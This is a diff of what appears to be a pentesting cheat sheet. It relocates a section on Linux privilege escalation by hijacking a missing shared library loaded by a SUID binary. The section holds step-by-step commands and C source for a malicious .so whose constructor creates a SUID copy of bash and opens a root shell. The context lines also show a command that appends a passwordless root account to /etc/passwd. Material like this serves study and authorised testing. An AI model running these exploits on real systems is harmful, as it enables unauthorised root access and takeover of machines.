@@ -718,29 +718,6 @@ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
 ```
 
-### create malicious .so file and place it in the location the program expects it to be (https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/)
-- First, find .so with SUID using 'find / -type f -perm -04000 -ls 2>/dev/null'
-- Next, attempt to execute the .so file e.g. $/usr/local/bin/suid-so, to see what happens
-- To see what is running at the back scene after executing the .so, we use strace 'strace /usr/local/bin/suid-so 2>&1'
-- Hunt for .so file (usually at /home), that is returned as "no such file or directory", using 'strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"'
-- once we identified that /home/user/.config/libcalc.so, is not found, we can create our own libcalc.so using the below libcalc.c and compile using 'gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c'
-- run $/usr/local/bin/suid-so, we should get root
-- https://rootrecipe.medium.com/suid-binaries-27c724ef753c
-```c
-#include <stdio.h>
-#include <stdlib.h>
-# GCC attribute which will be run when a shared library is loaded.
-static void inject() __attribute__((constructor));
-void inject() {
-# copies over /bin/bash and adds SUID bit to get root shell
-system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
-}
-```
-
-```bash
-gcc -shared -o /home/user/custom.so -fPIC /home/user/custom.c
-```
-
 ### Use LinPEAS and LinEnum and Linprivchecker
 - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
@@ -929,6 +906,29 @@ whoami
 
 13. Docker (skipped)
 - https://www.hackingarticles.in/docker-privilege-escalation/
+
+14. create malicious .so file and place it in the location the program expects it to be (https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/)
+- First, find .so with SUID using 'find / -type f -perm -04000 -ls 2>/dev/null'
+- Next, attempt to execute the .so file e.g. $/usr/local/bin/suid-so, to see what happens
+- To see what is running at the back scene after executing the .so, we use strace 'strace /usr/local/bin/suid-so 2>&1'
+- Hunt for .so file (usually at /home), that is returned as "no such file or directory", using 'strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"'
+- once we identified that /home/user/.config/libcalc.so, is not found, we can create our own libcalc.so using the below libcalc.c and compile using 'gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c'
+- run $/usr/local/bin/suid-so, we should get root
+- https://rootrecipe.medium.com/suid-binaries-27c724ef753c
+```c
+#include <stdio.h>
+#include <stdlib.h>
+# GCC attribute which will be run when a shared library is loaded.
+static void inject() __attribute__((constructor));
+void inject() {
+# copies over /bin/bash and adds SUID bit to get root shell
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+```bash
+gcc -shared -o /home/user/custom.so -fPIC /home/user/custom.c
+```
 
 # Active Directory Pentesting
 ## Enumeration
